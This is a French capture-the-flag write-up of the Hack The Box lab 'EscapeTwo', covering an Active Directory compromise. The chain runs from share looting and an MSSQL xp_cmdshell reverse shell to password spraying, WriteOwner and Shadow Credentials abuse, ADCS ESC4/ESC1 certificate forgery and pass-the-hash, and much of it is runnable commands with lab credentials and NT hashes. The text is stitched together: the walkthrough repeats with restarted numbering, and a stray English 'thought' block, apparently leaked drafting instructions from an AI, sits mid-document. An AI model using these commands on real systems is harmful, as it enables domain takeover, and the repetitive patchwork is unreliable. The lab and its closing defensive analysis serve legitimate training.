![Cover](cover.png)

### 1. Reconnaissance & Scanning

La phase initiale repose sur une approche **Assume Breach**. Nous disposons d'un compte utilisateur de bas niveau : `rose / KxEPkKe6R8su`. L'objectif est d'énumérer la surface d'attaque pour identifier des vecteurs d'escalade ou de pivot.

#### Énumération Réseau (Nmap)
Le scan complet des ports révèle un environnement **Windows Domain Controller** classique avec une instance **MSSQL** exposée.

```bash
# Scan exhaustif des services et scripts par défaut
nmap -p- --min-rate 10000 -sCV 10.10.11.51 -oN nmap_full.txt
```

**Résultats clés :**
*   **Domain :** `sequel.htb`
*   **Hostname :** `DC01.sequel.htb`
*   **Services :** DNS (53), Kerberos (88), LDAP (389/636), SMB (445), **MSSQL (1433)**, WinRM (5985).

#### Validation des Identifiants
Utilisation de **NetExec (nxc)** pour vérifier la validité des credentials fournis sur différents protocoles.

```bash
# Vérification SMB
nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su'
# Vérification MSSQL
nxc mssql 10.10.11.51 -u rose -p 'KxEPkKe6R8su'
```
Le compte est valide pour **SMB** et **MSSQL**, mais ne possède pas de droits d'accès via **WinRM**.

---

### 2. Énumération SMB & Analyse de Données

L'énumération des partages **SMB** révèle des répertoires non-standards susceptibles de contenir des informations sensibles.

```bash
nxc smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares
```

**Partages identifiés :**
*   `Users` : Contient les répertoires personnels (accès limité).
*   `Accounting Department` : Contient deux fichiers Excel : `accounting_2024.xlsx` et `accounts.xlsx`.

#### Récupération des fichiers
```bash
smbclient //10.10.11.51/Accounting\ Department -U rose%KxEPkKe6R8su -c "prompt OFF; mget *"
```

> **Schéma Mental :**
> Identifiants initiaux -> Énumération de partages réseau -> Exfiltration de documents Office -> Recherche de credentials "hardcoded" ou de fuites d'informations dans les métadonnées/contenus.

---

### 3. Analyse des Workbooks & Extraction de Secrets

Les fichiers `.xlsx` semblent corrompus et ne s'ouvrent pas avec les lecteurs standards. L'analyse via la commande `file` indique qu'il s'agit de structures **Zip archive**, ce qui est normal pour le format OOXML, mais les **Magic Bytes** sont incorrects.

#### Méthode 1 : Extraction Directe (Unzip)
Comme le format est reconnu comme un Zip malgré la corruption, nous pouvons extraire les fichiers XML internes. Le fichier `sharedStrings.xml` est particulièrement critique car il stocke toutes les chaînes de caractères uniques du tableur.

```bash
unzip accounts.xlsx -d accounts_extracted
cat accounts_extracted/xl/sharedStrings.xml | xmllint --format -
```

#### Méthode 2 : Restauration des Magic Bytes
L'en-tête des fichiers est `50 48 04 03` au lieu du standard **PK** (`50 4B 03 04`). En modifiant le deuxième octet via un **Hex Editor**, le fichier devient lisible par LibreOffice/Excel.

**Secrets extraits :**
*   `oscar : 86LxLBMgEWaKUnBG`
*   **`sa : MSSQLP@ssw0rd!`** (Compte administrateur SQL local)

---

### 4. Brèche Initiale : Exploitation MSSQL

Le compte `sa` (System Administrator) sur **MSSQL** est un vecteur critique car il permet souvent l'exécution de commandes système via la procédure stockée `xp_cmdshell`.

#### Validation du compte SA
Le compte `sa` ne fonctionne pas avec l'authentification Windows (Kerberos/NTLM), il faut utiliser l'authentification SQL locale (**Local Auth**).

```bash
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
```

#### Exécution de commandes & Reverse Shell
Connexion via `mssqlclient.py` d'Impacket pour activer `xp_cmdshell` et obtenir un shell.

```bash
# Connexion
mssqlclient.py sa:MSSQLP@ssw0rd!@10.10.11.51 -db master

# Activation de xp_cmdshell (si nécessaire)
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
# Résultat : sequel\sql_svc
```

Pour obtenir un accès interactif, nous injectons un payload **PowerShell Base64** (Reverse Shell) :

```bash
# Commande d'exécution via xp_cmdshell
xp_cmdshell powershell -e <BASE64_PAYLOAD>
```

> **Schéma Mental :**
> Accès SA MSSQL -> Activation de fonctionnalités d'administration (xp_cmdshell) -> Exécution de code arbitraire (RCE) -> Pivot du service SQL vers un Shell OS (sql_svc).

Le premier accès est établi en tant que **sequel\sql_svc**.

---

### 1. Énumération Interne & Extraction de Secrets

Disposant des identifiants de l'utilisateur **rose**, j'entame une énumération des services **SMB** et **MSSQL**. L'objectif est d'identifier des vecteurs de mouvement latéral ou des fuites de données dans les partages réseau.

```bash
# Vérification des accès SMB et énumération des partages
netexec smb dc01.sequel.htb -u rose -p 'KxEPkKe6R8su' --shares

# Connexion au service MSSQL (Authentification Windows)
mssqlclient.py -windows-auth sequel.htb/rose:KxEPkKe6R8su@dc01.sequel.htb
```

L'énumération du partage `Accounting Department` révèle deux fichiers Excel : `accounting_2024.xlsx` et `accounts.xlsx`. Ces fichiers sont corrompus et ne s'ouvrent pas nativement. L'analyse des **Magic Bytes** via un éditeur hexadécimal montre une signature incorrecte.

> **Schéma Mental : Récupération de données corrompues**
> Si un fichier Office (format OpenXML) est corrompu, il reste structurellement une archive **Zip**. On peut soit corriger le header hexadécimal (`50 4B 03 04`) pour forcer l'ouverture, soit extraire directement le contenu XML pour lire les chaînes de caractères brutes.

```bash
# Extraction des chaînes de caractères depuis le XML
unzip accounts.xlsx -d accounts/
cat accounts/xl/sharedStrings.xml | xmllint --xpath '//*[local-name()="t"]/text()' -
```

Cette extraction permet de récupérer le mot de passe du compte **sa** (SQL Administrator) : `MSSQLP@ssw0rd!`.

---

### 2. Foothold & Post-Exploitation (sql_svc)

Avec les privilèges **sa** sur l'instance **MSSQL**, je peux activer la procédure stockée **xp_cmdshell** pour exécuter des commandes système.

```bash
# Activation de xp_cmdshell et exécution de code
netexec mssql dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'whoami'

# Reverse Shell PowerShell (Base64 encoded)
netexec mssql dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'powershell -e <BASE64_PAYLOAD>'
```

Le shell obtenu s'exécute sous l'identité du compte de service **sequel\sql_svc**. L'énumération du système de fichiers révèle un répertoire `C:\SQL2019` contenant un fichier de configuration `sql-Configuration.INI`. Ce fichier expose un mot de passe en clair : `WqSZAF6CysDQbGb3`.

---

### 3. Mouvement Latéral vers ryan

Une attaque de **Password Spraying** interne avec ce nouveau secret confirme que le mot de passe est partagé par l'utilisateur **ryan**, qui possède des droits d'accès **WinRM**.

```bash
# Spraying du mot de passe trouvé
netexec smb dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
netexec winrm dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'

# Connexion via Evil-WinRM
evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i dc01.sequel.htb
```

---

### 4. Escalade de Privilèges : Abus de l'ADCS (ESC4 & ESC1)

L'analyse de l'**Active Directory** via **BloodHound** indique que l'utilisateur **ryan** possède le privilège **WriteOwner** sur le compte de service **ca_svc**.

> **Schéma Mental : Chaîne d'attaque ADCS**
> 1. **Take Ownership** : Utiliser le droit `WriteOwner` pour devenir propriétaire de l'objet `ca_svc`.
> 2. **DACL Manipulation** : S'octroyer le `GenericAll` sur l'objet.
> 3. **Shadow Credentials** : Créer un certificat pour usurper l'identité de `ca_svc`.
> 4. **ESC4 Exploitation** : `ca_svc` fait partie du groupe `Cert Publishers`, lui permettant de modifier les templates de certificats.

#### Étape A : Prise de contrôle de ca_svc
J'utilise **bloodyAD** pour modifier le propriétaire et obtenir le contrôle total.

```bash
# Changement de propriétaire et ajout de droits GenericAll
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan

# Obtention du NT Hash de ca_svc via Shadow Credentials
certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
```

#### Étape B : Exploitation ESC4 vers ESC1
Le compte **ca_svc** peut modifier le template `DunderMifflinAuthentication`. Ce template est vulnérable à **ESC4**. Je le reconfigure pour le rendre vulnérable à **ESC1** (permettant de spécifier un **Subject Alternative Name** ou **SAN**).

```bash
# Modification du template pour activer ESC1
certipy template -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -dc-ip 10.10.11.51

# Requête d'un certificat pour l'Administrateur du domaine
certipy req -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.51
```

#### Étape C : Compromission finale
Une fois le certificat `.pfx` obtenu, je l'utilise pour authentifier la session et récupérer le hash NT de l'administrateur.

```bash
# Authentification via certificat et récupération du hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51

# Accès final via Pass-The-Hash
evil-winrm -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i dc01.sequel.htb
```

---

thought
*   Role: Cybersecurity expert (Red Team), academic/pedagogical tone.
    *   Mission: Transform raw write-up text into a structured, technical, clear Phase 3 (Elevation of Privileges & Domination).
    *   Tone: Personal ("I"), pragmatic, factual.
    *   Vocabulary: Keep technical terms in English.
    *   Formatting: Markdown, bold for key concepts/vulns/tools.
    *   Code: Compact cheatsheet-style blocks.
    *   Mental Schemas: Include "> Schéma Mental :" sections.
    *   Constraint: NO filler phrases, NO intro/outro. Direct Markdown output.
    *   Input: Raw text about "EscapeTwo" HTB machine.

    *   *Current State (End of Phase 2):* Foothold as `sql_svc` (service account for MSSQL).
    *   *Step 1: Pivot to `ryan`.*
        *   Discovery: `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` contains `SQLSVCPASSWORD="WqSZAF6CysDQbGb3"`.
        *   Action: Password spraying. Works for `ryan`.
        *   Access: WinRM as `ryan`.
    *   *Step 2: Pivot to `ca_svc`.*
        *   Discovery: Bloodhound analysis. `ryan` has `WriteOwner` over `ca_svc`.
        *   Action: Use `bloodyAD` to take ownership and grant `GenericAll`.
        *   Action: Use `certipy shadow auto` to add a **Shadow Credential** (Key Credential) and retrieve the NT hash of `ca_svc`.
    *   *Step 3: Domain Admin (Root).*
        *   Discovery: ADCS (Active Directory Certificate Services) enumeration. `ca_svc` is in `Cert Publishers`.
        *   Vulnerability: **ESC4** on the `DunderMifflinAuthentication` template.
        *   Action: Modify the template to make it vulnerable to **ESC1** (Enrollee Supplies Subject).
        *   Action: Request a certificate for `administrator@sequel.htb`.
        *   Action: Authenticate with the certificate to get the Administrator NT hash.
    *   *Step 4: Beyond Root.*
        *   Analysis of the misconfigurations (Hardcoded passwords in INI files, excessive AD permissions, ADCS misconfigurations).

    *   *Section: Pivot vers Ryan*
        *   Focus on the configuration file.
    *   *Section: Compromission de ca_svc (Shadow Credentials)*
        *   Explain the `WriteOwner` logic.
    *   *Section: Escalade ADCS (ESC4 vers ESC1)*
        *   Detail the template manipulation.
    *   *Section: Beyond Root*
        *   Post-exploitation analysis.

    *   *Technical Terms:* Domain Controller, WriteOwner, Shadow Credential, ADCS, ESC4, ESC1, GenericAll, NT hash, etc.
    *   *Formatting:* Bold for **ESC4**, **Certipy**, **bloodyAD**, etc.
    *   *Mental Schemas:* Logic flow for AD ownership and ADCS.
### Phase 3 : Élévation de Privilèges & Domination

Une fois le pied posé sur la machine en tant que **sql_svc**, l'objectif est d'étendre la surface d'attaque au sein du domaine **sequel.htb** pour atteindre les privilèges de **Domain Admin**.

#### 1. Pivot vers l'utilisateur Ryan
L'énumération du système de fichiers révèle un répertoire inhabituel à la racine : `C:\SQL2019`. Ce dossier contient les fichiers d'installation de **SQL Server Express**. L'analyse du fichier de configuration révèle des informations critiques.

```powershell
# Lecture du fichier de configuration SQL
cat C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
```

Le fichier contient le paramètre `SQLSVCPASSWORD="WqSZAF6CysDQbGb3"`. Bien que ce mot de passe soit destiné à **sql_svc**, la réutilisation de mots de passe est courante. Un **Password Spraying** via **NetExec** confirme que ce secret est valide pour l'utilisateur **ryan**.

```bash
# Vérification des credentials pour Ryan
netexec winrm dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3
```

#### 2. Abus de privilèges sur ca_svc (Shadow Credentials)
En utilisant les accès de **ryan**, une collecte de données via **BloodHound** permet d'identifier un chemin d'attaque vers le compte de service de l'Autorité de Certification (**ca_svc**).

> **Schéma Mental : Prise de contrôle d'objet AD**
> Ryan possède le droit **WriteOwner** sur **ca_svc** -> Ryan se définit comme propriétaire -> Ryan s'octroie le **GenericAll** -> Ryan injecte un **Shadow Credential** pour usurper l'identité de **ca_svc**.

L'outil **bloodyAD** est utilisé pour manipuler les descripteurs de sécurité de l'objet :

```bash
# Changement du propriétaire et attribution du contrôle total
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
```

Une fois le contrôle total acquis, j'utilise **Certipy** pour configurer un **Shadow Credential**. Cette technique exploite l'attribut `msDS-KeyCredentialLink` pour obtenir un **TGT** (Ticket Granting Ticket) et extraire le **NT hash** de la cible sans changer son mot de passe.

```bash
# Attaque Shadow Credentials
certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
```
**Résultat :** NT hash pour `ca_svc` : `3b181b914e7a9d5508ea1e20bc2b7fce`

#### 3. Compromission Totale via ADCS (ESC4 & ESC1)
L'utilisateur **ca_svc** est membre du groupe **Cert Publishers**, ce qui lui confère des droits étendus sur les modèles de certificats (Templates). Une énumération avec **Certipy** identifie une vulnérabilité de type **ESC4** sur le modèle `DunderMifflinAuthentication`.

> **Schéma Mental : Escalade ADCS**
> **ESC4** (Full Control sur un Template) -> Modification du Template pour activer **ESC1** (**CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**) -> Demande d'un certificat au nom de l'Administrateur -> Authentification PKINIT pour récupérer le hash de l'Admin.

L'exploitation se déroule en trois étapes :

**Étape A : Modification du Template (ESC4 -> ESC1)**
Je modifie la configuration du modèle pour permettre la définition d'un **Subject Alternative Name (SAN)** arbitraire.

```bash
# Modification du template (Certipy v5.0.2+)
certipy template -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
```

**Étape B : Forge du certificat Administrateur**
Je sollicite un certificat en usurpant l'identité de l'administrateur du domaine.

```bash
# Requête du certificat via ESC1
certipy req -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

**Étape C : Extraction du Hash NT**
Le fichier `.pfx` obtenu permet de s'authentifier via Kerberos et de récupérer le hash final.

```bash
# Authentification et récupération du hash Administrator
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
```
**Hash final :** `7a8d4e04986afa8ed4060f75e5a0b3ff`

La compromission est finalisée par une connexion **Evil-WinRM** avec le hash récupéré (**Pass-the-Hash**).

---

### Beyond Root : Analyse Post-Exploitation

La compromission de **EscapeTwo** met en lumière plusieurs faiblesses structurelles critiques dans un environnement Active Directory :

1.  **Hardcoded Credentials & Information Leakage :** La présence d'un fichier `.INI` contenant le mot de passe en clair d'un compte de service est une erreur classique de déploiement. Ce fichier, accessible en lecture par un utilisateur standard, a servi de pivot direct vers un compte plus privilégié.
2.  **Abus de la délégation de propriété (WriteOwner) :** Le droit **WriteOwner** est souvent sous-estimé. Il permet à un attaquant de modifier le propriétaire d'un objet, et par extension, de modifier ses **DACL** pour s'octroyer un contrôle total (**GenericAll**). La surveillance des modifications de propriété d'objets sensibles est cruciale.
3.  **Infrastructures PKI non sécurisées (ADCS) :** L'attaque **ESC4** démontre que la sécurité de l'AD dépend directement de la sécurité de ses services de certificats. Accorder le **Full Control** sur des modèles de certificats à des groupes comme **Cert Publishers** (souvent peuplés de comptes de service) crée un vecteur d'escalade immédiat vers le rang de **Domain Admin**.
4.  **Shadow Credentials :** Cette méthode d'attaque moderne montre que la possession de droits d'écriture sur un objet utilisateur suffit à compromettre le compte sans interaction directe avec les mots de passe, rendant la détection plus complexe si les attributs `msDS-KeyCredentialLink` ne sont pas monitorés.